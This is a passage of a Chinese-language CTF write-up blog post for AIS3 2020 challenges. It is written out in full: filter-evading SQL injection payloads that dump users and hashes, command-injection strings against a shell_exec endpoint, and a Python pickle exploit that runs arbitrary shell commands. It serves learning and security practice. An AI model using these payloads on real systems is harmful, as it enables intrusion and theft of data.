+  <span class="nf">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s2">"sqlmap is child's play"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Get rid of you</span>
+<span class="nv">$bad</span> <span class="o">=</span> <span class="p">[</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'/*'</span><span class="p">,</span> <span class="s1">'*/'</span><span class="p">,</span> <span class="s1">'select'</span><span class="p">,</span> <span class="s1">'union'</span><span class="p">,</span> <span class="s1">'or'</span><span class="p">,</span> <span class="s1">'and'</span><span class="p">,</span> <span class="s1">'where'</span><span class="p">,</span> <span class="s1">'from'</span><span class="p">,</span> <span class="s1">'--'</span><span class="p">];</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$bad</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$bad</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+
+<span class="c1">// Auth</span>
+<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>
+<span class="nv">$row</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nc">SQLite3</span><span class="p">(</span><span class="s1">'/db.sqlite3'</span><span class="p">))</span>
+  <span class="o">-&gt;</span><span class="nf">querySingle</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = '</span><span class="nv">$username</span><span class="s2">' AND password = '</span><span class="nv">$hash</span><span class="s2">'"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nf">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'login failed'</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>注意到他會把空格刪掉，我們可以用<code class="language-plaintext highlighter-rouge">/**/</code>來代替空格，但在這裡要把它寫成<code class="language-plaintext highlighter-rouge">/oorr**oorr/</code>，讓下面兩次取代刪掉oorr的部分</p>
+
+<p>還有<code class="language-plaintext highlighter-rouge">--</code>也被過濾掉了，但這裡因為他是在篩選順序的最後一個，所以沒辦法用這一招，不過幸好<code class="language-plaintext highlighter-rouge">/*</code>也行得通，只是要換成<code class="language-plaintext highlighter-rouge">/oorr*</code></p>
+
+<p>開始inject啦，先試試看登入：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x'OoorrR''=''/oorr*   ( payload: x'OR''=''/* )
+</code></pre></div></div>
+
+<p>進去之後畫面上方有個反白的連結，是剛剛我們已經看到的原始碼 !??</p>
+
+<p>看來其實正確路線是要先亂猜帳號密碼再進來看原始碼呢 (ˊ· w ·`)</p>
+
+<p>好吧那我們就來看一下帳號密碼，網站會把query結果第二欄：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(username),1/oorr**oorr/frfrfromomom/oorr**oorr/users/oorr*
+(payload: x' union select 1,group_concat(username),1 from users/* )
+</code></pre></div></div>
+
+<p>這裡from不用oorr來藏是因為前面篩選順序的關係。全部的帳號：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root,admin,test,guest,info,adm,mysql,kaibro,oracle,ftp,pi,puppet,ansible,maojui,ec2,djosix,vagrant,azureuser,python,user,username,administrator
+</code></pre></div></div>
+
+<p>用同樣的方式可以拿到密碼的md5 hash，只是password要換成passwooorrrd（XDDD）</p>
+
+<p>把hash丟到網路工具可以找到不少個密碼，比如說admin的密碼也是admin… 但是拿到這些沒什麼用，所以接下來檢查users裡頭有沒有其他欄位：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,sql,1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/name='users'/oorr*
+payload: x' union select 1,sql,1 from sqlite_master where name='users'/*)
+results: CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT )
+</code></pre></div></div>
+
+<p>這樣子可以知道users裡頭各個欄位的名字：<code class="language-plaintext highlighter-rouge">id, username password</code>，然後就可以一個一個看。（都沒有flag @_@）</p>
+
+<p>既然題目提示flag就在資料庫裡，但是users裡頭又沒有，只能說明flag藏在另一個table裡啦～</p>
+
+<p>尋找資料庫裡所有table：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(name),1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/type='table'/oorr*
+payload: x' union select 1,group_concat(name),1 from sqlite_master where type='table'/*
+results: users,sqlite_sequence,garbage
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">sqlite_sequence</code>是sqlite自動創建的，用不太到，flag一定在garbage裡面。使用前面看column name的方法看garbage，得到<code class="language-plaintext highlighter-rouge">CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )</code>，一樣一個一個看，最後看到在value裡頭：</p>
+
+<p><img src="/assets/owl.png" alt="owl" /></p>
+
+<p>ㄏㄏ，反正我也不會用sqlmap。第一次解開SQL-I的題目真的是好爽A_A</p>
+
+<p>本題心得：遇到sqlite的題目，直接想辦法讀sqlite_master就好了。</p>
+
+<h3 id="web---squirrel">Web - Squirrel</h3>
+
+<p>一點進去發現一堆漂來漂去的松鼠，底下有一些看不懂的東西：</p>
+
+<p><img src="/assets/squirrel.png" alt="squirrel" /></p>
+
+<p>直接看原始碼，他是透過<code class="language-plaintext highlighter-rouge">api.php</code>去讀主機上的<code class="language-plaintext highlighter-rouge">/etc/passwd</code>，看來可以讀所有檔案！？直接叫他讀<code class="language-plaintext highlighter-rouge">api.php</code>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api.php?get=api.php
+
+{"output":"&lt;?php\n\nheader('Content-Type: application\/json');\n\nif ($file = @$_GET['get']) {\n    $output = shell_exec(\"cat '$file'\");\n    \n    if ($output !== null) {\n        echo json_encode([\n            'output' =&gt; $output\n        ]);\n    } else {\n        echo json_encode([\n            'error' =&gt; 'cannot get file'\n        ]);\n    }\n} else {\n    echo json_encode([\n        'error' =&gt; 'empty file path'\n    ]);\n}\n"}
+</code></pre></div></div>
+
+<p>看來這個php直接把你給的路徑丟進<code class="language-plaintext highlighter-rouge">shell_exec("cat '$file'")</code>裡頭，這相當於給了我們shell：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api.php?get=';ls;a='
+{"output":"api.php\ncss\nindex.html\njs\n"}
+/api.php?get=';cd ..;ls;a='
+{"output":"html\n"}
+/api.php?get=';cd ../..;ls;a='
+{"output":"backups\ncache\nlib\nlocal\nlock\nlog\nmail\nopt\nrun\nspool\ntmp\nwww\n"}
+/api.php?get=';cd ../../..;ls;a='
+{"output":"5qu1rr3l_15_4_k1nd_0f_b16_r47.txt\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
+</code></pre></div></div>
+
+<p>就拿到flag惹，松鼠蠻可愛的ww</p>
+
+<hr />
+
+<h3 id="web---snake">Web - Snake</h3>
+
+<p>這題我是在結束之後才看到的，原來其實很簡單QwQ</p>
+
+<p>題目給的python，會讀網址的data參數，base64解碼之後丟給pickle.loads()：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">import</span> <span class="nn">pickle</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">traceback</span>
+
+<span class="n">Response</span><span class="p">.</span><span class="n">default_mimetype</span> <span class="o">=</span> <span class="s">'text/plain'</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">values</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'data'</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            
+            <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+
+            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">traceback</span><span class="p">.</span><span class="n">format_exc</span><span class="p">()</span>
+        
+    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>弄了好就才發現那個<code class="language-plaintext highlighter-rouge">if data and not data</code>根本只是來告訴你flag在哪裡而已=_=</p>
+
+<p>其實這題的考點在於<code class="language-plaintext highlighter-rouge">pickle.loads()</code>這個函式有漏洞，如果放入一個設計過的class就可以執行任意python函式。像這樣：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">pickletools</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span> <span class="k">as</span> <span class="n">b64</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'enter command</span><span class="se">\n</span><span class="s">$ '</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="k">class</span> <span class="nc">Exploit</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        
+        <span class="n">command</span> <span class="o">=</span> <span class="p">(</span><span class="s">"__import__('os').popen('"</span><span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span><span class="s">"').read()"</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="p">))</span>
+
+<span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="n">b64</span><span class="p">(</span><span class="n">pickled</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>讓<code class="language-plaintext highlighter-rouge">__reduce__</code>函式傳回一個tuple，內包含要執行的函式加上一個tuple，執行<code class="language-plaintext highlighter-rouge">pickle.loads()</code>時就會把tuple裡的東西當作參數給你的函式執行。</p>
+
+<p>這裡弄那麼麻煩是因為原題目沒有<code class="language-plaintext highlighter-rouge">import os</code>，總之那個字串丟給<code class="language-plaintext highlighter-rouge">eval</code>執行之後就會用shell執行你要的指令，然後把結果傳回stdout。比如要看到flag是什麼，只要給他個<code class="language-plaintext highlighter-rouge">cat /flag</code>就有了：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
+</code></pre></div></div>
+
+<h2 id="pwn">pwn</h2>
+
+<hr />
+
+<h3 id="pwn---bof">pwn - BOF</h3>
+
+<p>我廢，所以我pwn只解的開這個簽到題 :sweat:</p>
+
+<p>經典的BOF，程式進入還會很鄙視的說這題很簡單：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>👻 They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.
+</code></pre></div></div>
+
+<p>稍微google一下之後知道這是指在遠端實施bof攻擊需要比自己測試多加8 byte，雖然我真的不知道為什麼</p>
+
+<p>直接把程式丟到Ghidra裡知道buffer長<code class="language-plaintext highlighter-rouge">0x30</code>，後台在<code class="language-plaintext highlighter-rouge">0x400688</code>，直接丟進pwntools拿到flag：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
+</code></pre></div></div>
+
+<h2 id="reverse">Reverse</h2>
+
+<hr />
+
+<h3 id="reverse---tsaibro">Reverse - TsaiBro</h3>
+
+<p>拿到一個執行檔、一個文字檔。可以猜測文字檔是拿某個字串輸進去之後出來的結果。</p>
+
+<p>拿ghidra開執行檔，轉換過程完全看不懂，不過給幾個input玩一下之後，看起來是一個字元可以對應到兩個「發財」，點的數量只跟字元有關係，所以就暴力對照解下去：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./tsaibro ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgjijklmnopqrstuvwxyz1234567890_<span class="o">{}</span>
+Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
+發財..發財.......發財..發財........發財........發財.發財........發財..發財........發財...發財........發財....發財....發財.....發財....發財......發財....發財.......發財....發財........發財.....發財.發財.....發財..發財.....發財...發財.....發財....發財.......發財.....發財.......發財......發財.......發財.......發財.......發財........發財....發財.發財....發財..發財....發財...發財....發財....
+<span class="o">(</span>以下略<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
+</span><span class="n">money</span> <span class="o">=</span> <span class="err">（</span><span class="n">略</span><span class="err">）</span>
+<span class="n">x</span> <span class="o">=</span> <span class="n">money</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'發財'</span><span class="p">)</span>
+<span class="n">alphabet</span> <span class="o">=</span> <span class="s">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
+<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">dic</span><span class="o">=</span><span class="p">{}</span>
+<span class="k">while</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">&lt;</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+    <span class="n">x1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">]);</span> <span class="n">x2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">dic</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">x1</span><span class="si">}{</span><span class="n">x2</span><span class="si">}</span><span class="s">=</span><span class="si">{</span><span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
+
+<span class="n">sym</span> <span class="o">=</span> <span class="err">（</span><span class="n">略</span><span class="err">）</span>
+<span class="n">x</span> <span class="o">=</span> <span class="n">sym</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'發財'</span><span class="p">)</span>
+<span class="n">alphabet</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyz'</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+    <span class="n">x1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">])</span>
+    <span class="n">x2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">dic</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">x1</span><span class="si">}{</span><span class="n">x2</span><span class="si">}</span><span class="s">=</span><span class="si">{</span><span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">sym</span> <span class="o">=</span> <span class="err">（</span><span class="n">略</span><span class="err">）</span>
+<span class="n">x</span> <span class="o">=</span> <span class="n">sym</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'發財'</span><span class="p">)</span>
+<span class="n">alphabet</span> <span class="o">=</span> <span class="s">'1234567890_{}'</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="mi">2</span><span class="o">*</span><span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+    <span class="n">x1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">])</span>
+    <span class="n">x2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">dic</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">x1</span><span class="si">}{</span><span class="n">x2</span><span class="si">}</span><span class="s">=</span><span class="si">{</span><span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">dic</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">=</span> <span class="err">（</span><span class="n">TsaiBroSaid裡面的東西</span><span class="err">）</span>
+<span class="n">cd</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'發財'</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cd</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">dic</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cd</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]))</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cd</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]))],</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'not found: '</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cd</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]))</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cd</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">])))</span>
+</code></pre></div></div>
+
+<p>得到flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
+</code></pre></div></div>
+
+  </div>
+
+  <footer class="article-footer">
+
+  <!-- <section class="share">
+  <a class="share-link" href="" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+    Twitter
+  </a>
+  <a class="share-link" href="" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+    Facebook
+  </a>
+  <a class="share-link" href="" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530'); return false;">
+    Google+
+  </a> 
+</section>
+ -->
+
+  <!-- <hr/> -->
+
+  <section class="author">
+  <div class="authorimage box" style="background: url(/assets/favicon.png)"></div>
+  <div class="authorinfo box">
+    <p>Author | Chen KB</p>
+    <p class="bio">
+      Article URL: <code>http://chenkb91.github.io/writeup/2020/07/01/writeup.html</code>
+    </p>
+  </div>
+</section>
+
+
+  </footer>
+
+  <!-- 
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname  = 'chenkb';
+    var disqus_identifier = '/writeup/2020/07/01/writeup';
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+ -->
+
+</article>
+
+          </div>
+        </div>
+      </div>
+      <footer class="site-footer">
+  <div class="container">
+    <div class="footer left column one-half">
+      <section class="small-font">
+        © 2019 Chen KB.  
+        Powered by <a href="https://github.com/jekyll/jekyll">jekyll</a> & <span style="color:red">❤</span>
+      </section>
+    </div>
+
+    <div class="footer right column one-half">
+      <section class="small-font">
+        
+        <a href="https://github.com/ChenKB91"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span></a>
+
+        
+        
+      </section>
+    </div>
+  </div>
+</footer>
+ 
+    </div>
+  </body>
+</html>
